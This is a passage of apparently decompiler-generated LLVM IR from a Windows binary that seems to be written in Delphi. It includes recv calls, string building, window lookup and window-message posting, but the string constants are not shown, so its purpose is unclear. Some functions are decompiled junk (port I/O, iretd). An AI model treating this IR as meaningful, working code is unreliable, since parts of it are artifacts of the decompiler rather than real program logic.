  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !927
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !928
  %2 = call i32 @StrPas(), !insn.addr !929
  ret i32 %2, !insn.addr !930
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !931
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !931
  %esp.0.reg2mem = alloca i32, !insn.addr !931
  %ecx.0.reg2mem = alloca i32, !insn.addr !931
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !932
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !933
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !933
  br label %dec_label_pc_4057d9, !insn.addr !933

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !934
  %2 = inttoptr i32 %1 to i32*, !insn.addr !934
  store i32 0, i32* %2, align 4, !insn.addr !934
  %3 = add i32 %esp.0.reload, -8, !insn.addr !935
  %4 = inttoptr i32 %3 to i32*, !insn.addr !935
  store i32 0, i32* %4, align 4, !insn.addr !935
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !936
  %6 = icmp eq i32 %5, 0, !insn.addr !936
  %7 = icmp eq i1 %6, false, !insn.addr !937
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !937
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !937
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !937

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !938
  %9 = inttoptr i32 %8 to i32*, !insn.addr !938
  store i32 0, i32* %9, align 4, !insn.addr !938
  %10 = call i32 @function_4036b8(), !insn.addr !939
  %11 = call i32 @function_4036b8(), !insn.addr !940
  %12 = call i32 @function_4036b8(), !insn.addr !941
  %13 = call i32 @function_4036b8(), !insn.addr !942
  %14 = call i32 @function_4036b8(), !insn.addr !943
  %15 = call i32 @function_4036b8(), !insn.addr !944
  %16 = call i32 @function_4036b8(), !insn.addr !945
  %17 = add i32 %esp.0.reload, -20, !insn.addr !946
  %18 = inttoptr i32 %17 to i32*, !insn.addr !946
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !946
  store i32 %19, i32* %18, align 4, !insn.addr !946
  %20 = add i32 %esp.0.reload, -24, !insn.addr !947
  %21 = inttoptr i32 %20 to i32*, !insn.addr !947
  store i32 4217413, i32* %21, align 4, !insn.addr !947
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !948
  %23 = add i32 %esp.0.reload, -28, !insn.addr !948
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !948
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !949
  %25 = call i32 @function_405664(), !insn.addr !950
  %26 = icmp eq i32 %25, 0, !insn.addr !951
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !952
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !952
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !952

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !953
  %28 = inttoptr i32 %27 to i32*, !insn.addr !953
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !953
  %29 = add i32 %esp.0.reload, -36, !insn.addr !954
  %30 = inttoptr i32 %29 to i32*, !insn.addr !954
  %31 = add i32 %esp.0.reload, -40, !insn.addr !955
  %32 = inttoptr i32 %31 to i32*, !insn.addr !955
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !955
  %33 = call i32 @"@LStrCatN"(), !insn.addr !956
  %34 = call i32 @function_405724(), !insn.addr !957
  %35 = call i32 @function_4057a4(), !insn.addr !958
  %36 = call i32 @function_405724(), !insn.addr !959
  %37 = call i32 @function_4057a4(), !insn.addr !960
  %38 = call i32 @"@LStrCat"(), !insn.addr !961
  %39 = call i32 @function_405724(), !insn.addr !962
  %40 = call i32 @function_4057a4(), !insn.addr !963
  %41 = call i32 @"@LStrCat"(), !insn.addr !964
  %42 = call i32 @function_405724(), !insn.addr !965
  %43 = call i32 @function_4057a4(), !insn.addr !966
  %44 = add i32 %esp.0.reload, -44, !insn.addr !967
  %45 = inttoptr i32 %44 to i32*, !insn.addr !967
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !967
  %46 = add i32 %esp.0.reload, -48, !insn.addr !968
  %47 = inttoptr i32 %46 to i32*, !insn.addr !968
  store i32 %arg1, i32* %47, align 4, !insn.addr !968
  %48 = add i32 %esp.0.reload, -52, !insn.addr !969
  %49 = inttoptr i32 %48 to i32*, !insn.addr !969
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !969
  %50 = add i32 %esp.0.reload, -56, !insn.addr !970
  %51 = inttoptr i32 %50 to i32*, !insn.addr !970
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !970
  %52 = call i32 @"@LStrCatN"(), !insn.addr !971
  %53 = call i32 @function_405724(), !insn.addr !972
  %54 = call i32 @function_4057a4(), !insn.addr !973
  %55 = add i32 %esp.0.reload, -60, !insn.addr !974
  %56 = inttoptr i32 %55 to i32*, !insn.addr !974
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !974
  %57 = add i32 %esp.0.reload, -64, !insn.addr !975
  %58 = inttoptr i32 %57 to i32*, !insn.addr !975
  store i32 %arg2, i32* %58, align 4, !insn.addr !975
  %59 = add i32 %esp.0.reload, -68, !insn.addr !976
  %60 = inttoptr i32 %59 to i32*, !insn.addr !976
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !976
  %61 = add i32 %esp.0.reload, -72, !insn.addr !977
  %62 = inttoptr i32 %61 to i32*, !insn.addr !977
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !977
  %63 = call i32 @"@LStrCatN"(), !insn.addr !978
  %64 = call i32 @function_405724(), !insn.addr !979
  %65 = call i32 @function_4057a4(), !insn.addr !980
  %66 = call i32 @function_405724(), !insn.addr !981
  %67 = call i32 @function_4057a4(), !insn.addr !982
  %68 = add i32 %esp.0.reload, -76, !insn.addr !983
  %69 = inttoptr i32 %68 to i32*, !insn.addr !983
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !983
  %70 = add i32 %esp.0.reload, -80, !insn.addr !984
  %71 = inttoptr i32 %70 to i32*, !insn.addr !984
  store i32 %arg1, i32* %71, align 4, !insn.addr !984
  %72 = add i32 %esp.0.reload, -84, !insn.addr !985
  %73 = inttoptr i32 %72 to i32*, !insn.addr !985
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !985
  %74 = add i32 %esp.0.reload, -88, !insn.addr !986
  %75 = inttoptr i32 %74 to i32*, !insn.addr !986
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !986
  %76 = add i32 %esp.0.reload, -92, !insn.addr !987
  %77 = inttoptr i32 %76 to i32*, !insn.addr !987
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !987
  %78 = add i32 %esp.0.reload, -96, !insn.addr !988
  %79 = inttoptr i32 %78 to i32*, !insn.addr !988
  store i32 %arg2, i32* %79, align 4, !insn.addr !988
  %80 = add i32 %esp.0.reload, -100, !insn.addr !989
  %81 = inttoptr i32 %80 to i32*, !insn.addr !989
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !989
  %82 = add i32 %esp.0.reload, -104, !insn.addr !990
  %83 = inttoptr i32 %82 to i32*, !insn.addr !990
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !990
  %84 = add i32 %esp.0.reload, -108, !insn.addr !991
  %85 = inttoptr i32 %84 to i32*, !insn.addr !991
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !991
  %86 = add i32 %esp.0.reload, -112, !insn.addr !992
  %87 = inttoptr i32 %86 to i32*, !insn.addr !992
  store i32 %arg3, i32* %87, align 4, !insn.addr !992
  %88 = add i32 %esp.0.reload, -116, !insn.addr !993
  %89 = inttoptr i32 %88 to i32*, !insn.addr !993
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !993
  %90 = add i32 %esp.0.reload, -120, !insn.addr !994
  %91 = inttoptr i32 %90 to i32*, !insn.addr !994
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !994
  %92 = add i32 %esp.0.reload, -124, !insn.addr !995
  %93 = inttoptr i32 %92 to i32*, !insn.addr !995
  store i32 %arg4, i32* %93, align 4, !insn.addr !995
  %94 = add i32 %esp.0.reload, -128, !insn.addr !996
  %95 = inttoptr i32 %94 to i32*, !insn.addr !996
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !996
  %96 = add i32 %esp.0.reload, -132, !insn.addr !997
  %97 = inttoptr i32 %96 to i32*, !insn.addr !997
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !997
  %98 = add i32 %esp.0.reload, -136, !insn.addr !998
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !998
  %100 = call i32 @"@LStrCatN"(), !insn.addr !999
  %101 = call i32 @function_405724(), !insn.addr !1000
  %102 = call i32 @function_4057a4(), !insn.addr !1001
  %103 = call i32 @function_405724(), !insn.addr !1002
  %104 = call i32 @function_4057a4(), !insn.addr !1003
  %105 = call i32 @function_405718(), !insn.addr !1004
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1005
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1005
  br label %dec_label_pc_405a10, !insn.addr !1005

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1006
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1006
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1007
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1008
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1009
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1009
  store i32 4217420, i32* %110, align 4, !insn.addr !1009
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1010
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1011
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1012
  ret i32 %113, !insn.addr !1013
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1014
  ret i32 %0, !insn.addr !1014
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1015
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1016
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1017
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1017
  store i32 %3, i32* %4, align 4, !insn.addr !1017
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1018
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1018
  %9 = add i8 %6, %8, !insn.addr !1018
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1018
  store i8 %9, i8* %10, align 1, !insn.addr !1018
  %11 = add i32 %2, 85, !insn.addr !1019
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1019
  %13 = load i8, i8* %12, align 1, !insn.addr !1019
  %14 = trunc i32 %1 to i8, !insn.addr !1019
  %15 = add i8 %13, %14, !insn.addr !1019
  store i8 %15, i8* %12, align 1, !insn.addr !1019
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1020
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1020
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1020
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1021
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1022
  %19 = add i32 %18, 1, !insn.addr !1022
  %20 = icmp eq i32 %19, 0, !insn.addr !1022
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1022
  %21 = icmp eq i1 %20, false, !insn.addr !1023
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1023

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1024
  %23 = call i32 @"@LStrClr"(), !insn.addr !1025
  br label %dec_label_pc_405b51, !insn.addr !1025

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1026
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1027
  ret i32 0, !insn.addr !1028
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1029
  ret i32 %0, !insn.addr !1029
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1030
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1031
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1032
  %2 = add i32 %1, -1, !insn.addr !1032
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1032
  ret i32 %0, !insn.addr !1033
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1034
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1035
  %2 = icmp eq i32 %0, 0, !insn.addr !1036
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1037
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1037

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1038
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1039
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1039
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1039
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1040
  %7 = icmp eq i1 %6, false, !insn.addr !1041
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1042
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1042

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1043
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1043
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1044
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1044
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1045
  %13 = icmp eq i1 %12, false, !insn.addr !1046
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1047
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1047

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1048
  %15 = add i32 %14, 22, !insn.addr !1049
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1050
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1050
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1051
  %18 = icmp eq i32* %17, null, !insn.addr !1052
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1053
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1053

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1054
  %20 = icmp eq i32* %19, null, !insn.addr !1055
  %21 = icmp eq i1 %20, false, !insn.addr !1056
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1056

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1057
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1057
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1057
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1058
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1059
  br label %dec_label_pc_405c7a, !insn.addr !1059

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1051
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1054
  store i32 20, i32* %19, align 4, !insn.addr !1060
  %27 = add i32 %26, 4, !insn.addr !1061
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1061
  store i32 0, i32* %28, align 4, !insn.addr !1061
  %29 = add i32 %26, 8, !insn.addr !1062
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1062
  store i32 0, i32* %30, align 4, !insn.addr !1062
  %31 = add i32 %26, 12, !insn.addr !1063
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1063
  store i32 0, i32* %32, align 4, !insn.addr !1063
  %33 = add i32 %26, 16, !insn.addr !1064
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1064
  store i32 0, i32* %34, align 4, !insn.addr !1064
  %35 = call i32 @function_4036c8(), !insn.addr !1065
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1066
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1066
  %37 = add i32 %26, 20, !insn.addr !1067
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1068
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1069
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1070
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1071
  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1072
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1073
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1073
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1074
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1074
  %46 = icmp eq i1 %45, false, !insn.addr !1075
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1076
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1076

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1077
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1077
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1078
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1078
  br label %dec_label_pc_405c7a, !insn.addr !1078

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1079
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1079
  %51 = load i32, i32* %50, align 4, !insn.addr !1079
  ret i32 %51, !insn.addr !1080
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1081
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1081
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1081
  store i8 %6, i8* %7, align 1, !insn.addr !1081
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1082
  %10 = udiv i32 %4, 256, !insn.addr !1082
  %11 = trunc i32 %10 to i8, !insn.addr !1082
  %12 = add i8 %9, %11, !insn.addr !1082
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1082
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1082
  store i8 %12, i8* %14, align 1, !insn.addr !1082
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1083
  %17 = add i32 %4, 6, !insn.addr !1083
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1083
  %19 = zext i1 %16 to i32, !insn.addr !1083
  %20 = and i32 %4, -65536, !insn.addr !1083
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1084
  %23 = or i1 %16, %22, !insn.addr !1084
  %24 = add i32 %18, 6, !insn.addr !1084
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1084
  %26 = zext i1 %23 to i32, !insn.addr !1084
  %27 = and i32 %25, 15, !insn.addr !1084
  %28 = or i32 %27, %20, !insn.addr !1084
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1084
  %31 = or i32 %28, %30, !insn.addr !1084
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1085
  %33 = load i8, i8* %32, align 1, !insn.addr !1085
  %34 = trunc i32 %27 to i8, !insn.addr !1085
  %35 = xor i8 %33, %34, !insn.addr !1085
  store i8 %35, i8* %32, align 1, !insn.addr !1085
  %36 = add i32 %0, 1311123697, !insn.addr !1086
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1086
  %38 = load i8, i8* %37, align 1, !insn.addr !1086
  %39 = udiv i32 %3, 256, !insn.addr !1086
  %40 = trunc i32 %39 to i8, !insn.addr !1086
  %41 = add i8 %38, %40, !insn.addr !1086
  store i8 %41, i8* %37, align 1, !insn.addr !1086
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1087
  %43 = load i32, i32* %42, align 4, !insn.addr !1087
  %44 = sub i32 %43, %31, !insn.addr !1087
  store i32 %44, i32* %42, align 4, !insn.addr !1087
  %45 = add i32 %3, 117, !insn.addr !1088
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1088
  %47 = load i8, i8* %46, align 1, !insn.addr !1088
  %48 = add i8 %47, %34, !insn.addr !1088
  %49 = icmp eq i8 %48, 0, !insn.addr !1088
  store i8 %48, i8* %46, align 1, !insn.addr !1088
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1089

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1090
  %51 = trunc i32 %3 to i16, !insn.addr !1091
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1091
  %53 = load i32, i32* %52, align 4, !insn.addr !1091
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1091
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1092
  %55 = load i8, i8* %54, align 1, !insn.addr !1092
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1092
  %56 = load i8, i8* %32, align 1, !insn.addr !1093
  %57 = add i8 %56, %34, !insn.addr !1093
  store i8 %57, i8* %32, align 1, !insn.addr !1093
  %58 = call i32 @__asm_iretd(), !insn.addr !1094
  %59 = add i32 %2, -117, !insn.addr !1095
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1095
  %61 = load i8, i8* %60, align 1, !insn.addr !1095
  %62 = add i8 %61, -69, !insn.addr !1095
  store i8 %62, i8* %60, align 1, !insn.addr !1095
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1096
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1097
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1097
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1097
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1098
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1099
  %67 = add i32 %66, 1, !insn.addr !1099
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1099
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1100
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1101
  ret i32 0, !insn.addr !1102

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1103
  store i32 %69, i32* %ebx, align 4, !insn.addr !1104
  %70 = icmp slt i32 %69, 0, !insn.addr !1105
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1106

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1107
  store i32 %71, i32* %ebx, align 4, !insn.addr !1107
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1108
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1109
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1110
  %75 = call i32 @function_403c90(), !insn.addr !1111
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1112
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1113
  br label %dec_label_pc_405d79, !insn.addr !1113

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1114
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1115
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1115
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1115
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1116
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1117
  %3 = add i32 %2, 1, !insn.addr !1117
  %4 = icmp eq i32 %3, 0, !insn.addr !1117
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1117
  %5 = icmp eq i1 %4, false, !insn.addr !1118
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1118

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1119
  br label %dec_label_pc_405da9, !insn.addr !1119

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1120
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1121
  ret i32 0, !insn.addr !1122
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1123
